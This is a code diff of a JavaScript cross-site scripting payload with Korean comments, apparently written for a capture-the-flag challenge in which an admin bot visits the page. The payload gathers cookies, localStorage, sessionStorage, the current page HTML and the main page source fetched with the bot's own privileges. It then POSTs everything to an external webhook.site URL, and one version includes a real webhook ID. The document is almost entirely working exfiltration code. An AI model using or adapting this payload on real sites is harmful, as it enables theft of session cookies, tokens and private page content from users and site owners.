@@ -1,19 +1,39 @@
-// xss.js 업데이트
 (async () => {
-    // 1초 정도 기다려서 페이지/쿠키 로딩 확실히 보장 (타이밍 이슈 방지)
+    // 1. 기본 대기 (페이지 로딩 보장)
     await new Promise(r => setTimeout(r, 1000));
 
-    let data = {
-        msg: "Debug Info",
-        cookie: document.cookie, // 플래그가 여기 있어야 함
-        location: window.location.href, // 봇이 접속한 실제 주소
-        domain: document.domain, // 현재 도메인
-        origin: window.origin,
-        // 혹시 쿠키가 HttpOnly라서 안 보이는 건지 확인 (빈값이면 HttpOnly 가능성 높음)
-        cookieEnabled: navigator.cookieEnabled 
+    // 2. 다양한 저장소 확인 (Cookie 외)
+    const storageData = {
+        local: JSON.stringify(window.localStorage),
+        session: JSON.stringify(window.sessionStorage)
     };
 
-    fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
+    // 3. [핵심] 봇의 권한으로 메인 페이지('/') 소스 코드 긁어오기
+    // 만약 HttpOnly 쿠키로 인증된 상태라면, fetch 요청 시 쿠키가 자동으로 포함됩니다.
+    // index.html에 플래그가 렌더링 되어 있을 수 있습니다.
+    let indexPageContent = "";
+    try {
+        const response = await fetch('/', { method: 'GET' });
+        indexPageContent = await response.text();
+    } catch (e) {
+        indexPageContent = "Fetch Failed: " + e.toString();
+    }
+
+    // 4. 현재 페이지의 전체 HTML (혹시 봇이 보는 화면에 주석 등으로 플래그가 있는지)
+    const currentHTML = document.documentElement.outerHTML;
+
+    // 5. 데이터 전송
+    let data = {
+        msg: "Exfiltration Data",
+        cookie: document.cookie, // HttpOnly면 비어있음
+        localStorage: storageData.local, // 혹시 여기에?
+        sessionStorage: storageData.session,
+        location: window.location.href,
+        indexPage: indexPageContent, // 메인 페이지 소스 (가장 유력)
+        currentHTML: currentHTML // 현재 페이지 소스
+    };
+
+    fetch('https://webhook.site/YOUR_WEBHOOK_URL', {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify(data)
